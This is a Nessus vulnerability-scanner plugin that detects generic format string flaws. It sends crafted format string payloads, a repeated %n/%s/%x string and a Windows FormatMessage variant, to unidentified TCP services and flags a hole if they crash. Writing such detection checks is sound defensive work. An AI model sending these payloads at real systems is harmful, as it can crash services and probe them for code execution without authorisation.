#
# (C) Tenable Network Security, Inc.
#

# References:
# Date:	 Wed, 20 Mar 2002 11:35:04 +0100 (CET)
# From:	"Wojciech Purczynski" <cliph@isec.pl>
# To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org
# CC: security@isec.pl
# Subject: Bypassing libsafe format string protection
# 
# TBD: Add those tests:
#	printf("%'n", &target);
#	printf("%In", &target);
#	printf("%2$n", "unused argument", &target);
#


include("compat.inc");

if (description)
{
 script_id(11133);
 script_version("$Revision: 1.27 $");
 script_cvs_date("$Date: 2014/05/24 02:15:09 $");
 
 script_name(english: "Generic Format String Detection");
 script_summary(english: "Generic format string attack");
 
 script_set_attribute(attribute:"synopsis", value:
"It may be possible to execute code on the remote host.");
 script_set_attribute(attribute:"description", value:
"Nessus killed the remote service by sending it specially crafted data. 
The remote service seems to be vulnerable to a format string attack.  An
attacker might use this flaw to make it crash or even execute arbitrary
code on this host.");
 script_set_attribute(attribute:"solution", value:
"Upgrade the software or contact the vendor regarding this
vulnerability.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/11/12");
 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL); 
 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");
 script_family(english: "Misc.");

 script_dependencie("find_service1.nasl", "find_service2.nasl");
 script_require_ports("Services/unknown");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

c_payload = crap(data:"%#0123456x%04x%x%s%p%n%d%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%04x%%#0123456x%%x%%s%%p%%n%%d%%o%%u%%c%%h%%l%%q%%j%%z%%Z%%t%%i%%e%%g%%f%%a%%C%%S%%04x",length:256);

# Windows FormatMessage function uses a different syntax
win_payload = '';
for (i = 1; i < 20; i ++)
  win_payload += '%'+i+'!n!' + '%'+i+'!s!' ;

port = get_unknown_svc();
if (! port) exit(0, "No unknown service was found");


if (! get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

send(socket: soc, data: "xxxxxxxxxxxxxxxxxxxxxxxxxx");
close(soc);

n = 0;
foreach p (make_list(c_payload, win_payload))
{
  soc = open_sock_tcp(port);
  if (soc)
  {
    n ++;
    send(socket: soc, data: p );
    close(soc);
  }
}
if (n == 0) exit(1, "Cannot reconnect to port "+port+ ".");

if (service_is_dead(port: port, exit: 1))
security_hole(port);
exit(0);

